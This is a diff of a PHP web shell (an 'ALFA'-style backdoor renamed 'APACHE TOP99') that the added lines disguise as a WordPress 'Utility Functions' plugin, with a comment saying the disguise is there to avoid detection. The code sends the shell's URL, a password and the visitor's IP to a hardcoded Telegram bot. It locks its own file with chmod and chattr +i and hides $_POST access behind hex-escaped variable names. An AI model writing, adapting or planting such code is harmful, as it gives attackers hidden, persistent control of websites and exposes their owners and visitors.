@@ -1,22 +1,34 @@
-
 <?php
-$lock = __FILE__;
-@system("chmod ugo-w $lock");
-@system("chattr +i $lock");
+// Mimic WordPress or CMS file to avoid detection
+/*
+ * Plugin Name: Utility Functions
+ * Description: Core utility functions for site management
+ * Version: 1.0
+ * Author: Site Admin
+ *
+ // Mimic WordPress or CMS file to avoid detection
+/*
+ * Plugin Name: Utility Functions
+ * Description: Core utility functions for site management
+ * Version: 1.0
+ * Author: Site Admin
+ */
 ini_set("upload_max_filesize", "30M");
 ini_set("post_max_size", "30M");
 ini_set("max_execution_time", 300);
 ini_set("max_input_time", 300);
 error_reporting(0);
-// 🖼️ Enhanced PNG Header Generator (to hide payloads in image disguise)
 $botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
 $chatId = "8478623770";
 $xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
 $logMessage =
-    "___ALFA SHELL___ \n\n Shell nya =\n $xPath \n\n NEW =\n $PASSWORD \n\n IP   :\n [ " .
+    "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
     $_SERVER["REMOTE_ADDR"] .
     " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
+$lock = __FILE__;
+@system("chmod ugo-w $lock");
+@system("chattr +i $lock");
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"] =
     "\x5f\x5f\x50\x4f\x53\x54";
 ${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"] = "\x5f_PO\x53T";
